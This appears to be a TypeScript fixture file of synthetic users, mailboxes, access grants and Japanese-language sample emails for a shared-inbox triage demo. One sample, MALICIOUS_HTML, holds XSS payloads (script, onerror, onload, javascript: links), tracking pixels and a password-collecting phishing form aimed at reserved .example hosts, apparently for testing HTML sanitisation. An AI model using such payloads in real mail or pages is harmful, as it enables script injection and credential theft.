import type { RawInboundMessage } from './types.js';
import type { Grant, Mailbox, User } from '../domain/types.js';

// Entirely synthetic sample data. Every address uses a reserved .example or
// .invalid domain; every person is a neutral role name. Nothing here is read
// from a real account, browser, credential store or log.

export const SYNTHETIC_NOTICE = '※これは動作確認用に合成したテスト用メールです。実在の人物・組織とは関係ありません。';

export const SAMPLE_USERS: User[] = [
  { id: 'u-editor-a', displayName: '編集担当A', roleLabel: '編集者（サポート・営業）', email: 'editor-a@staff.invalid', canManageAccess: false },
  { id: 'u-viewer-b', displayName: '閲覧担当B', roleLabel: '閲覧者（サポート・請求）', email: 'viewer-b@staff.invalid', canManageAccess: false },
  { id: 'u-editor-c', displayName: '編集担当C', roleLabel: '編集者（請求）・閲覧者（営業）', email: 'editor-c@staff.invalid', canManageAccess: false },
  { id: 'u-noaccess-d', displayName: '委員D', roleLabel: '委員（共有受信箱の閲覧のみ）', email: 'noaccess-d@staff.invalid', canManageAccess: false },
  { id: 'u-admin', displayName: 'デモ管理者', roleLabel: '権限管理のみ（メール閲覧不可）', email: 'admin@staff.invalid', canManageAccess: true },
];

export const SAMPLE_MAILBOXES: Mailbox[] = [
  { id: 'mbx-support', name: 'サポート窓口', address: 'support@shared-mail.example', sourceKey: 'mock-src-support', scope: 'committee-shared' },
  { id: 'mbx-sales', name: '営業窓口', address: 'sales@shared-mail.example', sourceKey: 'mock-src-sales', scope: 'committee-shared' },
  { id: 'mbx-billing', name: '請求窓口', address: 'billing@shared-mail.example', sourceKey: 'mock-src-billing', scope: 'committee-shared' },
];

export const SAMPLE_GRANTS: Grant[] = [
  { userId: 'u-editor-a', mailboxId: 'mbx-support', level: 'edit' },
  { userId: 'u-editor-a', mailboxId: 'mbx-sales', level: 'edit' },
  { userId: 'u-viewer-b', mailboxId: 'mbx-support', level: 'read' },
  { userId: 'u-viewer-b', mailboxId: 'mbx-billing', level: 'read' },
  { userId: 'u-editor-c', mailboxId: 'mbx-billing', level: 'edit' },
  { userId: 'u-editor-c', mailboxId: 'mbx-sales', level: 'read' },
];

const SUPPORT = { name: 'サポート窓口', address: 'support@shared-mail.example' };
const SALES = { name: '営業窓口', address: 'sales@shared-mail.example' };
const BILLING = { name: '請求窓口', address: 'billing@shared-mail.example' };
const CUSTOMER1 = { name: '顧客サンプル1', address: 'customer1@customer.example' };
const CUSTOMER2 = { name: '顧客サンプル2', address: 'customer2@customer.example' };
const PARTNER1 = { name: '取引先サンプル1', address: 'partner1@partner.example' };
const PARTNER2 = { name: '取引先サンプル2', address: 'partner2@partner.example' };
const TESTER = { name: '検証用送信者', address: 'html-test@sender.example' };

/** Hostile synthetic HTML. Every network target uses a reserved .example host. */
export const MALICIOUS_HTML = `
<html><head><title>検証</title><meta http-equiv="refresh" content="0;url=https://redirect.example/">
<base href="https://base.example/"><link rel="stylesheet" href="https://css.example/x.css">
<style>body{background:url(https://tracker.example/bg.png)} @import url(https://css.example/i.css);</style>
<script>window.parent.__smmXss = 'script';</script></head>
<body onload="window.parent.__smmXss='onload'">
<h2>危険な HTML を含む合成メールです</h2>
<p onclick="window.parent.__smmXss='click'">この段落にはイベント属性が付いています。</p>
<p>追跡画像: <img src="https://tracker.example/pixel.gif?id=synthetic" width="1" height="1" onerror="window.parent.__smmXss='onerror'"></p>
<p><img src="x" onerror="window.parent.__smmXss='onerror2'">壊れた画像</p>
<p>リンク: <a href="https://phishing.example/login" target="_blank">ここをクリック</a>
 / <a href="javascript:window.parent.__smmXss='js-link'">スクリプトリンク</a></p>
<form action="https://phishing.example/collect" method="post"><input name="password" type="password" value=""><button type="submit">パスワードを送信</button></form>
<iframe src="https://frame.example/"></iframe>
<object data="https://object.example/x.swf"></object><embed src="https://embed.example/x">
<svg onload="window.parent.__smmXss='svg'"><image href="https://svg.example/x.png"></image></svg>
<div style="background-image:url(https://tracker.example/div.png)">背景画像付き要素</div>
<video src="https://media.example/v.mp4" autoplay></video>
<p>${SYNTHETIC_NOTICE}</p>
</body></html>`;

export interface MockFeedEntry {
  sourceKey: string;
  /** Batch 1 is imported on reset; batch 2 is released by the demo admin ("新着を模擬配信"). */
  batch: 1 | 2;
  raw: RawInboundMessage | Record<string, unknown>;
}

function entry(sourceKey: string, batch: 1 | 2, raw: RawInboundMessage): MockFeedEntry {
  return { sourceKey, batch, raw };
}

const contractMessage = {
  messageId: '<contract-100@partner.example>',
  subject: '契約更新と請求について',
  from: PARTNER1,
  to: [SALES, BILLING],
  cc: [PARTNER2],
  date: '2026-09-02T01:00:00.000Z',
};
const contractText = `営業窓口・請求窓口 ご担当者様\n\n来期の契約更新と、請求書の送付先変更について相談させてください。\n\n取引先サンプル1\n${SYNTHETIC_NOTICE}`;

export const MOCK_FEED: MockFeedEntry[] = [
  // ---- batch 1: サポート窓口
  entry('mock-src-support', 1, {
    providerMessageId: 'mock-support-0001',
    receivedAt: '2026-09-01T00:10:00.000Z',
    deliveredTo: SUPPORT.address,
    headers: { messageId: '<login-001@customer.example>', subject: 'ログインできません', from: CUSTOMER1, to: [SUPPORT], date: '2026-09-01T00:09:00.000Z' },
    rawHeaders: { 'Delivered-To': SUPPORT.address, Received: 'from mx.mock.invalid by mock-connector' },
    text: `サポート窓口 ご担当者様\n\n昨日からサービスにログインできません。パスワードは正しいはずです。\n\n顧客サンプル1\n${SYNTHETIC_NOTICE}`,
  }),
  entry('mock-src-support', 1, {
    providerMessageId: 'mock-support-0002',
    receivedAt: '2026-09-01T02:30:00.000Z',
    deliveredTo: SUPPORT.address,
    headers: {
      messageId: '<login-002@customer.example>', subject: 'Re: ログインできません', from: CUSTOMER1, to: [SUPPORT],
      date: '2026-09-01T02:29:00.000Z', inReplyTo: '<login-001@customer.example>', references: ['<login-001@customer.example>'],
    },
    rawHeaders: { 'Delivered-To': SUPPORT.address },
    text: `追記です。ログイン画面でエラーコード E-1001 が表示されます。\n\n顧客サンプル1\n${SYNTHETIC_NOTICE}`,
  }),
  entry('mock-src-support', 1, {
    providerMessageId: 'mock-support-0003',
    receivedAt: '2026-09-03T05:00:00.000Z',
    deliveredTo: SUPPORT.address,
    headers: { messageId: '<html-test-001@sender.example>', subject: '【検証用】危険な HTML を含む合成メール', from: TESTER, to: [SUPPORT], date: '2026-09-03T04:59:00.000Z' },
    rawHeaders: { 'Delivered-To': SUPPORT.address },
    html: MALICIOUS_HTML,
  }),
  entry('mock-src-support', 1, {
    providerMessageId: 'mock-support-0004',
    receivedAt: '2026-09-04T03:00:00.000Z',
    deliveredTo: SUPPORT.address,
    headers: { messageId: '<log-001@customer.example>', subject: 'ログファイルの送付', from: CUSTOMER2, to: [SUPPORT], date: '2026-09-04T02:58:00.000Z' },
    rawHeaders: { 'Delivered-To': SUPPORT.address },
    text: `エラー発生時のログを添付します。ご確認ください。\n\n顧客サンプル2\n${SYNTHETIC_NOTICE}`,
    attachments: [{ filename: 'sample-log.txt', contentType: 'text/plain', content: '2026-09-04 synthetic log line: E-1001 (dummy)\n' }],
  }),
  // ---- batch 1: 営業窓口
  entry('mock-src-sales', 1, {
    providerMessageId: 'mock-sales-0001',
    receivedAt: '2026-09-01T04:00:00.000Z',
    deliveredTo: SALES.address,
    headers: { messageId: '<quote-001@partner.example>', subject: '見積もりの依頼', from: PARTNER1, to: [SALES], date: '2026-09-01T03:59:00.000Z' },
    rawHeaders: { 'Delivered-To': SALES.address },
    text: `営業窓口 ご担当者様\n\n標準プラン 10 ライセンスの見積もりをお願いします。\n\n取引先サンプル1\n${SYNTHETIC_NOTICE}`,
  }),
  entry('mock-src-sales', 1, {
    providerMessageId: 'mock-sales-0002',
    receivedAt: '2026-09-02T01:05:00.000Z',
    deliveredTo: SALES.address,
    headers: contractMessage,
    rawHeaders: { 'Delivered-To': SALES.address },
    text: contractText,
  }),
  entry('mock-src-sales', 1, {
    providerMessageId: 'mock-sales-0003',
    receivedAt: '2026-09-05T00:00:00.000Z',
    deliveredTo: SALES.address,
    headers: { messageId: '<event-2026@partner.example>', subject: '展示会のご案内', from: PARTNER2, to: [SALES], date: '2026-09-04T23:59:00.000Z' },
    rawHeaders: { 'Delivered-To': SALES.address },
    html: `<h1>展示会のご案内</h1><p><img src="https://newsletter.example/banner.png" alt="バナー"></p><p>詳細は <a href="https://event.example/2026">特設ページ</a> をご覧ください。</p><p>${SYNTHETIC_NOTICE}</p><img src="https://tracker.example/open.gif">`,
  }),
  // ---- batch 1: 請求窓口
  entry('mock-src-billing', 1, {
    providerMessageId: 'mock-billing-0001',
    receivedAt: '2026-09-02T01:06:00.000Z',
    deliveredTo: BILLING.address,
    headers: contractMessage,
    rawHeaders: { 'Delivered-To': BILLING.address },
    text: contractText,
  }),
  entry('mock-src-billing', 1, {
    providerMessageId: 'mock-billing-0002',
    receivedAt: '2026-09-02T06:00:00.000Z',
    deliveredTo: BILLING.address,
    headers: {
      messageId: '<contract-101@partner.example>', subject: 'Re: 契約更新と請求について', from: PARTNER1, to: [BILLING],
      date: '2026-09-02T05:59:00.000Z', inReplyTo: '<contract-100@partner.example>', references: ['<contract-100@partner.example>'],
    },
    rawHeaders: { 'Delivered-To': BILLING.address },
    text: `請求窓口 ご担当者様\n\n請求書の送付先は経理部門宛てに変更をお願いします。\n\n取引先サンプル1\n${SYNTHETIC_NOTICE}`,
  }),
  entry('mock-src-billing', 1, {
    providerMessageId: 'mock-billing-0003',
    receivedAt: '2026-09-03T00:00:00.000Z',
    deliveredTo: BILLING.address,
    headers: { messageId: '<invoice-001@customer.example>', subject: '請求書の再発行', from: CUSTOMER2, to: [BILLING], date: '2026-09-02T23:58:00.000Z' },
    rawHeaders: { 'Delivered-To': BILLING.address },
    text: `請求窓口 ご担当者様\n\n8 月分の請求書を再発行してください。\n\n顧客サンプル2\n${SYNTHETIC_NOTICE}`,
  }),
  entry('mock-src-billing', 1, {
    providerMessageId: 'mock-billing-0004',
    receivedAt: '2026-09-06T00:00:00.000Z',
    deliveredTo: BILLING.address,
    headers: { messageId: '<late-001@customer.example>', subject: '支払い遅延の連絡（請求窓口限定）', from: CUSTOMER1, to: [BILLING], date: '2026-09-05T23:58:00.000Z' },
    rawHeaders: { 'Delivered-To': BILLING.address },
    text: `請求窓口 ご担当者様\n\n今月の支払いが数日遅れます。識別用の語: 請求限定キーワード\n\n顧客サンプル1\n${SYNTHETIC_NOTICE}`,
  }),
  // ---- batch 2 (released by the demo admin)
  entry('mock-src-support', 2, {
    providerMessageId: 'mock-support-0005',
    receivedAt: '2026-09-07T01:00:00.000Z',
    deliveredTo: SUPPORT.address,
    headers: { messageId: '<reset-001@customer.example>', subject: 'パスワード再設定のお願い', from: CUSTOMER2, to: [SUPPORT], date: '2026-09-07T00:59:00.000Z' },
    rawHeaders: { 'Delivered-To': SUPPORT.address },
    text: `パスワード再設定のメールが届きません。確認をお願いします。\n\n顧客サンプル2\n${SYNTHETIC_NOTICE}`,
  }),
  // Provider re-delivers an item it already sent: must be recognized as a duplicate.
  entry('mock-src-support', 2, {
    providerMessageId: 'mock-support-0001',
    receivedAt: '2026-09-01T00:10:00.000Z',
    deliveredTo: SUPPORT.address,
    headers: { messageId: '<login-001@customer.example>', subject: 'ログインできません', from: CUSTOMER1, to: [SUPPORT], date: '2026-09-01T00:09:00.000Z' },
    rawHeaders: { 'Delivered-To': SUPPORT.address },
    text: `サポート窓口 ご担当者様\n\n昨日からサービスにログインできません。パスワードは正しいはずです。\n\n顧客サンプル1\n${SYNTHETIC_NOTICE}`,
  }),
  entry('mock-src-sales', 2, {
    providerMessageId: 'mock-sales-0004',
    receivedAt: '2026-09-07T02:00:00.000Z',
    deliveredTo: SALES.address,
    headers: {
      messageId: '<quote-002@partner.example>', subject: 'Re: 見積もりの依頼', from: PARTNER1, to: [SALES],
      date: '2026-09-07T01:59:00.000Z', inReplyTo: '<quote-001@partner.example>', references: ['<quote-001@partner.example>'],
    },
    rawHeaders: { 'Delivered-To': SALES.address },
    text: `追加で、年間契約の場合の割引条件も教えてください。\n\n取引先サンプル1\n${SYNTHETIC_NOTICE}`,
  }),
  // Malformed item from the provider: must be rejected without aborting the sync.
  { sourceKey: 'mock-src-billing', batch: 2, raw: { providerMessageId: 'mock-billing-0005', receivedAt: 'not-a-date', headers: { subject: 42 } } },
];

/** Sample handling data applied after the initial import (by receipt provider ID). */
export const SAMPLE_TRIAGE: {
  sourceKey: string;
  providerMessageId: string;
  actorId: string;
  status?: 'unhandled' | 'in_progress' | 'on_hold' | 'done';
  assigneeId?: string;
  labels?: string[];
  note?: string;
}[] = [
  { sourceKey: 'mock-src-support', providerMessageId: 'mock-support-0001', actorId: 'u-editor-a', status: 'in_progress', assigneeId: 'u-editor-a', labels: ['要確認'], note: 'サンプルメモ: 再現手順を確認中です。' },
  { sourceKey: 'mock-src-sales', providerMessageId: 'mock-sales-0002', actorId: 'u-editor-a', labels: ['契約'] },
  { sourceKey: 'mock-src-billing', providerMessageId: 'mock-billing-0001', actorId: 'u-editor-c', status: 'on_hold', assigneeId: 'u-editor-c', labels: ['請求'], note: 'サンプルメモ: 請求窓口だけの内部メモです。' },
  { sourceKey: 'mock-src-billing', providerMessageId: 'mock-billing-0004', actorId: 'u-editor-c', labels: ['請求限定ラベル'] },
];
